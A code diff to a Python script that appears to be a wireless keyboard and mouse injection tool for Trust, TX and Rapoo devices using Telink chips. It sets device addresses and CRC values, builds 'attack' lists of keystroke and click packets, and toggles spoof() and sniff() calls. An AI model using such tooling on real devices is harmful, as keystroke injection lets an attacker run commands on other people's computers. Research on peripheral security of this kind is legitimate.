@@ -20,8 +20,8 @@ common.init_args('./main.py')
 common.parse_and_init()
 
 
-trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
-# poss_keyboard = Tlsr85Keyboard("d5:54:cb", "80", "aa:aa:cc", 22, 0x11021, 0xcb01, 2)
+trust_keyboard = Tlsr85Keyboard("4a:b4:cb:80", "aa:aa:b5", 0x11021, 0x24bf)
+# poss_keyboard = Tlsr85Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)
 
 
 attack = [
@@ -41,8 +41,8 @@ attack = [
 
 #trust_keyboard.spoof(attack)
 
-trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc", "aa:aa:aa:b5", 30, 0x11021, 0x24bf, 2)
-#trust_mouse.sniff()
+trust_mouse = Tlsr85Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
+#trust_keyboard.sniff()
 
 tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
 tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)
@@ -61,10 +61,10 @@ attack = [
     *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
-# tx_keyboard.spoof(attack)
+#tx_keyboard.spoof(attack)
 
-#m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
-#tx_mouse.spoof(m)
+m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
+# tx_mouse.spoof(m)
 
 rapoo_Keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
 
@@ -82,10 +82,12 @@ attack = [
     rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
+
 #rapoo_Keyboard.spoof(attack)
 
 rapoo_Mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
+#rapoo_Keyboard.sniff()
 attack = [
     rapoo_Mouse.build_packet([MouseClickType.LEFT_CLICK])
 ]
-rapoo_Mouse.spoof(attack)
+#rapoo_Mouse.spoof(attack)
